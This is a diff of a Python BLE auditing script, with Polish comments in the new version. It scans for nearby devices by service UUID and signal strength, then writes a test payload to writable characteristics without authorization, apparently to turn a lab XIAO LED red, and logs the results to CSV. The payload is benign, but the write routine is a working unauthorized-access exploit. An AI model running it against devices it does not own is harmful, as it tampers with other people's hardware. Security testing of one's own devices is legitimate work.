@@ -1,90 +1,72 @@
-﻿import asyncio
+﻿
+
+import asyncio
+import csv
+import os
 import logging
-from bleak import BleakClient, BleakScanner
-from bleak.exc import BleakError
+from bleak import BleakScanner, BleakClient
 
-# Professional logger setup
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s [%(levelname)s] %(message)s",
-    datefmt="%H:%M:%S"
-)
-logger = logging.getLogger("BLE_Auto_Auditor")
+# Konfiguracja logowania
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
+logger = logging.getLogger("BLE_Smart_Scanner")
 
-class BLEVulnerabilityScanner:
-    def __init__(self, target_name):
-        self.target_name = target_name
-        self.target_device = None
-        self.vulnerable_characteristics = []
+CSV_FILE = "ble_audit_results.csv"
 
-    async def run_scan(self):
-        logger.info(f"Starting automated Black-Box audit for: {self.target_name}")
+# --- DEFINICJE ZAKRESÓW I WZORCÓW ---
+XIAO_VND_PREFIX = "87654321"     
+TARGET_SERVICE_UUID = "12345678-1234-1234-1234-123456789012".lower()
+
+async def audit_device(device, writer):
+    logger.info(f"[*] Rozpoczynam audyt urządzenia: {device.address}")
+    try:
+        async with BleakClient(device.address, timeout=10.0) as client:
+            services = client.services
+            for service in services:
+                for char in service.characteristics:
+                    status = "Safe"
+                    
+                    # Sprawdzenie Twojego konkretnego wzorca XIAO (Characteristic UUID)
+                    if char.uuid.startswith(XIAO_VND_PREFIX.lower()):
+                        status = "VULNERABLE_TARGET_DETECTED"
+                        logger.warning(f"  [!] Wykryto znany wzorzec XIAO na {char.uuid}")
+                        writer.writerow([device.name, device.address, status, char.uuid])
+                        
+                        # --- TUTAJ NASTĘPUJE ATAK (PAYLOAD INJECTION) ---
+                        logger.info(f"    -> Wstrzykiwanie nieautoryzowanego payloadu do {char.uuid}...")
+                        test_payload = bytes([255, 0, 0]) # Czerwony kolor dla diody NeoPixel
+                        
+                        try:
+                            await client.write_gatt_char(char.uuid, test_payload, response=True)
+                            logger.warning(f"    -> [!] SUKCES: Ominięto autoryzację. Wstrzyknięto payload!")
+                        except Exception as e:
+                            logger.error(f"    -> [-] Błąd zapisu lub autoryzacji: {e}")
+                        # ------------------------------------------------
+
+    except Exception as e:
+        logger.error(f"[-] Błąd podczas audytu {device.address}: {e}")
+
+async def main():
+    logger.info("Rozpoczynam nasłuch w poszukiwaniu urządzeń o silnym sygnale (RSSI > -60)...")
+
+    # POPRAWKA: Zmiana d.rssi na ad.rssi zapobiega warningom z biblioteki Bleak
+    target_device = await BleakScanner.find_device_by_filter(
+        lambda d, ad: (TARGET_SERVICE_UUID in ad.service_uuids) and (ad and ad.rssi > -60),
+        timeout=20.0
+    )
+
+    if target_device:
+        logger.info(f"[+] ZNALEZIONO CEL: {target_device.name} [{target_device.address}]")
         
-        # STEP 1: Device Discovery (Finding the target)
-        self.target_device = await BleakScanner.find_device_by_filter(
-            lambda d, ad: self.target_name in (d.name, ad.local_name if ad else ""),
-            timeout=15.0
-        )
-
-        if not self.target_device:
-            logger.error("Target not found in the vicinity.")
-            return
-
-        logger.info(f"Target found: MAC {self.target_device.address}. Establishing connection...")
-
-        # STEP 2: Exploration and Attack (Looking for unlocked doors)
-        try:
-            async with BleakClient(self.target_device, timeout=15.0) as client:
-                logger.info("Connected. Starting service mapping (GATT Discovery)...")
-                
-                # Retrieve all services and characteristics from the device (LIKE A REAL HACKER)
-                services = client.services
-                
-                for service in services:
-                    for char in service.characteristics:
-                        # Look for characteristics that CAN be written to
-                        if "write" in char.properties or "write-without-response" in char.properties:
-                            logger.info(f"[INFO] Found entry point (Write): UUID {char.uuid}")
-                            
-                            # STEP 3: Attack attempt (Injecting test payload)
-                            logger.info(f"    -> Attempting unauthorized write to {char.uuid}...")
-                            test_payload = bytes([255, 0, 0]) # Red color payload for XIAO LED
-                            
-                            try:
-                                await client.write_gatt_char(char.uuid, test_payload, response=True)
-                                
-                                # If we reached this point, the device did not reject the write! VULNERABILITY FOUND!
-                                logger.warning(f"    -> [!] CRITICAL VULNERABILITY: Write to {char.uuid} succeeded without authorization/pairing!")
-                                self.vulnerable_characteristics.append(char.uuid)
-                                
-                            except BleakError as e:
-                                if "Authentication" in str(e) or "Paired" in str(e):
-                                    logger.info(f"    -> [SECURE] Device blocked the write attempt. Authorization required.")
-                                else:
-                                    logger.info(f"    -> [WRITE ERROR] Other error: {e}")
-                                    
-        except Exception as e:
-            logger.error(f"Critical error during scanning: {e}")
-
-        # Final report
-        self.print_report()
-
-    def print_report(self):
-        print("\n" + "="*60)
-        print("SECURITY AUDIT REPORT (BLE VULNERABILITY SCAN)")
-        print("="*60)
-        print(f"Target: {self.target_name}")
-        print(f"Found open write vulnerabilities: {len(self.vulnerable_characteristics)}")
-        for vuln in self.vulnerable_characteristics:
-            print(f" - [CRITICAL] Open write on UUID: {vuln}")
-        if len(self.vulnerable_characteristics) == 0:
-            print("System appears secure (No open entry points found).")
-        print("="*60 + "\n")
-
+        # Przygotowanie pliku CSV i uruchomienie audytu/ataku
+        file_exists = os.path.isfile(CSV_FILE)
+        with open(CSV_FILE, mode='a', newline='') as file:
+            writer = csv.writer(file)
+            if not file_exists:
+                writer.writerow(["Device Name", "MAC Address", "Status", "Vulnerable UUID"])
+            
+            await audit_device(target_device, writer)
+    else:
+        logger.error("[-] Nie znaleziono celu w pobliżu.")
 
 if __name__ == "__main__":
-    # Now you ONLY provide the device name, the script "hacks" the rest by itself!
-    TARGET_DEVICE_NAME = "XIAO_Vulnerable_LED"
-
-    scanner = BLEVulnerabilityScanner(TARGET_DEVICE_NAME)
-    asyncio.run(scanner.run_scan())
+    asyncio.run(main())
